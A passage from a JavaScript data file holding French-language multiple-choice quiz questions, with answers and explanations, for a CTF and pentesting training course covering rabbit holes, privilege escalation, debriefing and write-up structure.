      { q: "Qu'est-ce qu'un « rabbit hole » dans le contexte d'un CTF ?", options: ["Le flag final d'une machine", "Une piste d'investigation qui semble prometteuse mais s'avère être une impasse", "Un type de payload Metasploit", "Le nom d'une catégorie de vulnérabilité OWASP"], correct: 1, explanation: "Un rabbit hole désigne une piste de recherche qui consomme du temps sans mener à une avancée réelle vers la compromission ; savoir l'identifier rapidement est une compétence essentielle du pentester." },
      { q: "Dans la méthodologie de résolution d'une machine CTF, que vient faire l'étape de « privilege escalation » ?", options: ["Elle scanne les ports ouverts de la machine", "Elle élève les privilèges d'un accès initial limité vers un accès administrateur/root", "Elle chiffre les communications avec la cible", "Elle génère automatiquement le write-up final"], correct: 1, explanation: "La privilege escalation intervient après un accès initial (souvent avec des droits limités) et vise à obtenir des privilèges plus élevés, généralement nécessaires pour atteindre le flag administrateur final." },
      { q: "Quel est l'intérêt principal du débriefing collectif après la résolution des machines CTF ?", options: ["Il permet d'obtenir automatiquement plus de flags", "Il permet de comparer les approches, identifier des méthodes alternatives et partager les rabbit holes rencontrés", "Il remplace la rédaction du write-up", "Il est purement administratif et sans valeur pédagogique"], correct: 1, explanation: "Le débriefing collectif reproduit une pratique professionnelle courante (peer review) : confronter différentes méthodologies pour un même objectif enrichit considérablement l'apprentissage individuel." },
      { q: "Quelle section ne doit JAMAIS manquer dans un write-up de CTF professionnel ?", options: ["Une liste des autres apprenants du groupe", "La reconnaissance initiale (résultats Nmap) et la chaîne d'exploitation détaillée étape par étape", "Le prix d'achat de la licence TryHackMe", "Une critique du design de l'interface TryHackMe"], correct: 1, explanation: "Un write-up professionnel doit permettre à un tiers de reproduire intégralement la démarche : il documente donc systématiquement la reconnaissance et chaque étape de la chaîne d'exploitation jusqu'au flag final." }
    ]
  }
];
